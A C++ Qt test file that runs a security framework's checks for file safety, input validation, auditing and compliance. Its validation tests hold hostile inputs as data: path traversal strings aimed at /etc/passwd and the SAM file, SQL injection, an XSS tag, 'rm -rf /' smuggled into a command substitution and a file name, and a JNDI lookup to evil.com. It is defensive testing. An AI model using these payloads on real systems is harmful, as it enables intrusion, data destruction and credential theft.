#include <QCoreApplication>
#include <QTest>
#include <QDebug>
#include <QTimer>
#include <QEventLoop>

#include "security_safety_testing.h"
#include "input_validation_testing.h"
#include "security_audit_testing.h"

/**
 * @brief Example comprehensive security and safety testing
 * 
 * This example demonstrates how to use the security and safety testing framework
 * to validate file operation safety, input validation, and security compliance.
 * 
 * Requirements: 10.1, 10.2, 10.3, 10.4, 10.5
 */
class ExampleSecuritySafetyTesting : public QObject
{
    Q_OBJECT

private:
    SecuritySafetyTesting* m_securitySafetyTesting;
    InputValidationTesting* m_inputValidationTesting;
    SecurityAuditTesting* m_securityAuditTesting;

private slots:
    void initTestCase() {
        qDebug() << "===========================================";
        qDebug() << "Security and Safety Testing Example";
        qDebug() << "===========================================";
        qDebug();
        
        // Initialize testing frameworks
        m_securitySafetyTesting = new SecuritySafetyTesting(this);
        m_inputValidationTesting = new InputValidationTesting(this);
        m_securityAuditTesting = new SecurityAuditTesting(this);
        
        // Configure testing frameworks
        setupSecuritySafetyTesting();
        setupInputValidationTesting();
        setupSecurityAuditTesting();
    }
    
    void cleanupTestCase() {
        delete m_securitySafetyTesting;
        delete m_inputValidationTesting;
        delete m_securityAuditTesting;
        
        qDebug() << "\n===========================================";
        qDebug() << "Security and Safety Testing Completed";
        qDebug() << "===========================================";
    }
    
    /**
     * Test 1: File Operation Safety Testing
     * Comprehensive testing of file operation safety features
     */
    void test_fileOperationSafety() {
        qDebug() << "\n[Test 1] File Operation Safety Testing";
        qDebug() << "=======================================";
        
        // Run all security and safety tests
        QList<SecuritySafetyTesting::SecurityTestResult> results = 
            m_securitySafetyTesting->runAllSecurityTests();
        
        qDebug() << "   Total security tests executed:" << results.size();
        
        // Analyze results
        int passed = 0, failed = 0;
        for (const auto& result : results) {
            if (result.passed) {
                passed++;
                qDebug() << "   ✓" << result.testName;
            } else {
                failed++;
                qDebug() << "   ✗" << result.testName << "-" << result.errorMessage;
            }
        }
        
        qDebug() << "   Summary - Passed:" << passed << "Failed:" << failed;
        
        // Verify critical safety features
        bool backupTestPassed = false;
        bool integrityTestPassed = false;
        bool protectionTestPassed = false;
        
        for (const auto& result : results) {
            if (result.testName.contains("Backup") && result.passed) {
                backupTestPassed = true;
            }
            if (result.testName.contains("Integrity") && result.passed) {
                integrityTestPassed = true;
            }
            if (result.testName.contains("Protection") && result.passed) {
                protectionTestPassed = true;
            }
        }
        
        QVERIFY(backupTestPassed);
        QVERIFY(integrityTestPassed);
        QVERIFY(protectionTestPassed);
        
        qDebug() << "✓ File operation safety testing completed successfully";
    }
    
    /**
     * Test 2: Input Validation and Sanitization Testing
     * Comprehensive testing of input validation and sanitization
     */
    void test_inputValidationAndSanitization() {
        qDebug() << "\n[Test 2] Input Validation and Sanitization Testing";
        qDebug() << "===================================================";
        
        // Run all input validation tests
        QList<InputValidationTesting::ValidationResult> results = 
            m_inputValidationTesting->runAllValidationTests();
        
        qDebug() << "   Total validation tests executed:" << results.size();
        
        // Analyze results by category
        QMap<InputValidationTesting::ValidationCategory, int> categoryResults;
        
        for (const auto& result : results) {
            if (result.inputBlocked || result.sanitizationCorrect) {
                categoryResults[result.category]++;
            }
        }
        
        qDebug() << "   Path Traversal Tests Passed:" 
                 << categoryResults[InputValidationTesting::ValidationCategory::PathTraversal];
        qDebug() << "   Injection Attack Tests Passed:" 
                 << categoryResults[InputValidationTesting::ValidationCategory::InjectionAttacks];
        qDebug() << "   File Name Validation Tests Passed:" 
                 << categoryResults[InputValidationTesting::ValidationCategory::FileNameValidation];
        qDebug() << "   Configuration Security Tests Passed:" 
                 << categoryResults[InputValidationTesting::ValidationCategory::ConfigurationSecurity];
        
        // Test specific validation scenarios
        testPathTraversalPrevention();
        testInjectionAttackPrevention();
        testFileNameValidation();
        testConfigurationValidation();
        
        qDebug() << "✓ Input validation and sanitization testing completed successfully";
    }
    
    /**
     * Test 3: Security Audit and Compliance Testing
     * Comprehensive security audit and compliance validation
     */
    void test_securityAuditAndCompliance() {
        qDebug() << "\n[Test 3] Security Audit and Compliance Testing";
        qDebug() << "================================================";
        
        // Run full security audit
        QList<SecurityAuditTesting::AuditResult> auditResults = 
            m_securityAuditTesting->runFullSecurityAudit();
        
        qDebug() << "   Total audit tests executed:" << auditResults.size();
        
        // Analyze audit results
        int auditsPassed = 0, auditsFailed = 0;
        for (const auto& result : auditResults) {
            if (result.passed) {
                auditsPassed++;
                qDebug() << "   ✓" << result.auditName;
            } else {
                auditsFailed++;
                qDebug() << "   ✗" << result.auditName << "-" << result.errorMessage;
                
                // Log warnings
                for (const QString& warning : result.warnings) {
                    qDebug() << "     Warning:" << warning;
                }
            }
        }
        
        qDebug() << "   Audit Summary - Passed:" << auditsPassed << "Failed:" << auditsFailed;
        
        // Run vulnerability assessment
        QList<SecurityAuditTesting::VulnerabilityResult> vulnerabilities = 
            m_securityAuditTesting->runVulnerabilityAssessment();
        
        qDebug() << "   Vulnerabilities discovered:" << vulnerabilities.size();
        
        for (const auto& vuln : vulnerabilities) {
            qDebug() << "   Vulnerability:" << vuln.title 
                     << "Severity:" << vuln.severity
                     << "Exploitable:" << (vuln.exploitable ? "Yes" : "No");
        }
        
        // Test compliance standards
        testComplianceStandards();
        
        // Verify critical security requirements
        bool encryptionAuditPassed = false;
        bool auditTrailPassed = false;
        bool accessControlPassed = false;
        
        for (const auto& result : auditResults) {
            if (result.auditName.contains("Encryption") && result.passed) {
                encryptionAuditPassed = true;
            }
            if (result.auditName.contains("Audit Trail") && result.passed) {
                auditTrailPassed = true;
            }
            if (result.auditName.contains("Access Control") && result.passed) {
                accessControlPassed = true;
            }
        }
        
        QVERIFY(encryptionAuditPassed);
        QVERIFY(auditTrailPassed);
        QVERIFY(accessControlPassed);
        
        qDebug() << "✓ Security audit and compliance testing completed successfully";
    }
    
    /**
     * Test 4: Integrated Security Testing
     * Test integration between all security components
     */
    void test_integratedSecurityTesting() {
        qDebug() << "\n[Test 4] Integrated Security Testing";
        qDebug() << "=====================================";
        
        // Test end-to-end security workflow
        testEndToEndSecurityWorkflow();
        
        // Test security under stress conditions
        testSecurityUnderStress();
        
        // Test security recovery scenarios
        testSecurityRecoveryScenarios();
        
        qDebug() << "✓ Integrated security testing completed successfully";
    }
    
    /**
     * Test 5: Security Performance Testing
     * Test security features under performance constraints
     */
    void test_securityPerformanceTesting() {
        qDebug() << "\n[Test 5] Security Performance Testing";
        qDebug() << "======================================";
        
        // Measure security overhead
        QTime timer;
        timer.start();
        
        // Run security tests multiple times to measure performance
        for (int i = 0; i < 10; i++) {
            m_securitySafetyTesting->testBackupCreationAndValidation();
        }
        
        int backupPerformance = timer.elapsed();
        qDebug() << "   Backup creation performance (10 iterations):" << backupPerformance << "ms";
        
        timer.restart();
        
        // Test input validation performance
        for (int i = 0; i < 100; i++) {
            m_inputValidationTesting->validatePathTraversal("../../../etc/passwd");
        }
        
        int validationPerformance = timer.elapsed();
        qDebug() << "   Input validation performance (100 iterations):" << validationPerformance << "ms";
        
        // Verify performance is acceptable
        QVERIFY(backupPerformance < 10000);  // Less than 10 seconds for 10 backups
        QVERIFY(validationPerformance < 1000); // Less than 1 second for 100 validations
        
        qDebug() << "✓ Security performance testing completed successfully";
    }

private:
    void setupSecuritySafetyTesting() {
        SecuritySafetyTesting::SafetyTestConfig safetyConfig;
        safetyConfig.enableBackupValidation = true;
        safetyConfig.enableIntegrityChecking = true;
        safetyConfig.enablePermissionTesting = true;
        safetyConfig.enableProtectionRuleTesting = true;
        safetyConfig.maxTestFiles = 50;
        safetyConfig.maxTestFileSize = 5 * 1024 * 1024; // 5MB
        
        m_securitySafetyTesting->setSafetyTestConfig(safetyConfig);
        
        SecuritySafetyTesting::ValidationTestConfig validationConfig;
        validationConfig.enablePathTraversalTests = true;
        validationConfig.enableInjectionTests = true;
        validationConfig.enableFileNameValidation = true;
        validationConfig.enableConfigValidation = true;
        
        m_securitySafetyTesting->setValidationTestConfig(validationConfig);
    }
    
    void setupInputValidationTesting() {
        InputValidationTesting::ValidationConfig config;
        config.enablePathTraversalTests = true;
        config.enableInjectionTests = true;
        config.enableFileNameTests = true;
        config.enableConfigTests = true;
        config.enableURLTests = true;
        config.enableDataFormatTests = true;
        config.maxFileNameLength = 255;
        config.maxPathLength = 4096;
        config.allowedFileExtensions = {".txt", ".jpg", ".png", ".pdf"};
        config.allowedProtocols = {"http", "https", "ftp"};
        
        m_inputValidationTesting->setValidationConfig(config);
    }
    
    void setupSecurityAuditTesting() {
        SecurityAuditTesting::AuditConfig auditConfig;
        auditConfig.enableSecurityScanning = true;
        auditConfig.enableComplianceChecks = true;
        auditConfig.enableAuditTrailValidation = true;
        auditConfig.enableEncryptionValidation = true;
        auditConfig.enablePolicyEnforcement = true;
        auditConfig.enableVulnerabilityAssessment = true;
        
        auditConfig.enabledStandards = {
            SecurityAuditTesting::ComplianceStandard::ISO27001,
            SecurityAuditTesting::ComplianceStandard::NIST,
            SecurityAuditTesting::ComplianceStandard::GDPR
        };
        
        m_securityAuditTesting->setAuditConfig(auditConfig);
        
        SecurityAuditTesting::SecurityPolicy policy;
        policy.requireEncryption = true;
        policy.requireAuditLogging = true;
        policy.requireAccessControl = true;
        policy.requireSecureDeletion = true;
        policy.requireBackupEncryption = true;
        policy.minPasswordLength = 12;
        policy.maxFailedLogins = 3;
        policy.sessionTimeout = 15;
        policy.allowedCiphers = {"AES-256-GCM", "ChaCha20-Poly1305"};
        
        m_securityAuditTesting->setSecurityPolicy(policy);
    }
    
    void testPathTraversalPrevention() {
        qDebug() << "     Testing path traversal prevention...";
        
        QStringList maliciousPaths = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        };
        
        int blocked = 0;
        for (const QString& path : maliciousPaths) {
            InputValidationTesting::ValidationResult result = 
                m_inputValidationTesting->validatePathTraversal(path);
            
            if (result.inputBlocked) {
                blocked++;
            }
        }
        
        qDebug() << "       Path traversal attacks blocked:" << blocked << "of" << maliciousPaths.size();
        QVERIFY(blocked >= maliciousPaths.size() * 0.8); // At least 80% blocked
    }
    
    void testInjectionAttackPrevention() {
        qDebug() << "     Testing injection attack prevention...";
        
        QStringList injectionAttacks = {
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "$(rm -rf /)",
            "${jndi:ldap://evil.com/a}"
        };
        
        int blocked = 0;
        for (const QString& attack : injectionAttacks) {
            InputValidationTesting::ValidationResult result = 
                m_inputValidationTesting->validateSQLInjection(attack);
            
            if (result.inputBlocked) {
                blocked++;
            }
        }
        
        qDebug() << "       Injection attacks blocked:" << blocked << "of" << injectionAttacks.size();
        QVERIFY(blocked >= injectionAttacks.size() * 0.8); // At least 80% blocked
    }
    
    void testFileNameValidation() {
        qDebug() << "     Testing file name validation...";
        
        QStringList maliciousNames = {
            "con.txt",
            "file<script>.txt",
            "file|rm -rf /.txt",
            QString(300, 'a') + ".txt"
        };
        
        int blocked = 0;
        for (const QString& name : maliciousNames) {
            InputValidationTesting::ValidationResult result = 
                m_inputValidationTesting->validateFileName(name);
            
            if (result.inputBlocked) {
                blocked++;
            }
        }
        
        qDebug() << "       Malicious file names blocked:" << blocked << "of" << maliciousNames.size();
        QVERIFY(blocked >= maliciousNames.size() * 0.8); // At least 80% blocked
    }
    
    void testConfigurationValidation() {
        qDebug() << "     Testing configuration validation...";
        
        QStringList maliciousConfigs = {
            "../../../etc/passwd",
            "'; DROP TABLE config; --",
            "<script>alert('xss')</script>",
            QString(2000, 'A')
        };
        
        int blocked = 0;
        for (const QString& config : maliciousConfigs) {
            InputValidationTesting::ValidationResult result = 
                m_inputValidationTesting->validateConfigurationValue("test_key", config);
            
            if (result.inputBlocked) {
                blocked++;
            }
        }
        
        qDebug() << "       Malicious configurations blocked:" << blocked << "of" << maliciousConfigs.size();
        QVERIFY(blocked >= maliciousConfigs.size() * 0.8); // At least 80% blocked
    }
    
    void testComplianceStandards() {
        qDebug() << "     Testing compliance standards...";
        
        // Test GDPR compliance
        QList<SecurityAuditTesting::AuditResult> gdprResults = 
            m_securityAuditTesting->runComplianceAudit(SecurityAuditTesting::ComplianceStandard::GDPR);
        
        bool gdprPassed = false;
        for (const auto& result : gdprResults) {
            if (result.passed) {
                gdprPassed = true;
                break;
            }
        }
        
        qDebug() << "       GDPR compliance:" << (gdprPassed ? "PASS" : "FAIL");
        
        // Test ISO27001 compliance
        QList<SecurityAuditTesting::AuditResult> isoResults = 
            m_securityAuditTesting->runComplianceAudit(SecurityAuditTesting::ComplianceStandard::ISO27001);
        
        bool isoPassed = false;
        for (const auto& result : isoResults) {
            if (result.passed) {
                isoPassed = true;
                break;
            }
        }
        
        qDebug() << "       ISO27001 compliance:" << (isoPassed ? "PASS" : "FAIL");
    }
    
    void testEndToEndSecurityWorkflow() {
        qDebug() << "     Testing end-to-end security workflow...";
        
        // Simulate a complete security workflow
        // 1. Input validation
        QString userInput = "../../../etc/passwd";
        InputValidationTesting::ValidationResult validationResult = 
            m_inputValidationTesting->validatePathTraversal(userInput);
        
        // 2. If input is blocked, workflow should stop
        if (validationResult.inputBlocked) {
            qDebug() << "       ✓ Malicious input blocked at validation stage";
        } else {
            qDebug() << "       ✗ Malicious input not blocked - security breach!";
        }
        
        // 3. Test backup creation for legitimate operations
        SecuritySafetyTesting::SecurityTestResult backupResult = 
            m_securitySafetyTesting->testBackupCreationAndValidation();
        
        if (backupResult.passed) {
            qDebug() << "       ✓ Backup creation and validation working";
        } else {
            qDebug() << "       ✗ Backup creation failed:" << backupResult.errorMessage;
        }
        
        // 4. Test audit trail creation
        SecurityAuditTesting::AuditResult auditResult = 
            m_securityAuditTesting->auditAuditTrailIntegrity();
        
        if (auditResult.passed) {
            qDebug() << "       ✓ Audit trail integrity maintained";
        } else {
            qDebug() << "       ✗ Audit trail integrity compromised";
        }
    }
    
    void testSecurityUnderStress() {
        qDebug() << "     Testing security under stress conditions...";
        
        // Simulate high load with multiple concurrent security operations
        QTime timer;
        timer.start();
        
        // Run multiple validation tests concurrently
        for (int i = 0; i < 50; i++) {
            m_inputValidationTesting->validatePathTraversal("../malicious/path");
            m_inputValidationTesting->validateSQLInjection("'; DROP TABLE test; --");
        }
        
        int stressTestTime = timer.elapsed();
        qDebug() << "       Stress test completed in:" << stressTestTime << "ms";
        
        // Verify security still works under stress
        QVERIFY(stressTestTime < 5000); // Should complete within 5 seconds
    }
    
    void testSecurityRecoveryScenarios() {
        qDebug() << "     Testing security recovery scenarios...";
        
        // Test recovery from security incidents
        // This would involve testing backup restoration, audit log recovery, etc.
        
        SecuritySafetyTesting::SecurityTestResult recoveryResult = 
            m_securitySafetyTesting->testBackupCreationAndValidation();
        
        if (recoveryResult.passed) {
            qDebug() << "       ✓ Security recovery mechanisms working";
        } else {
            qDebug() << "       ✗ Security recovery failed";
        }
    }
};

int main(int argc, char* argv[])
{
    QCoreApplication app(argc, argv);
    ExampleSecuritySafetyTesting test;
    int result = QTest::qExec(&test, argc, argv);
    
    // Process any remaining events before exit
    QCoreApplication::processEvents();
    
    return result;
}

#include "example_security_safety_testing.moc"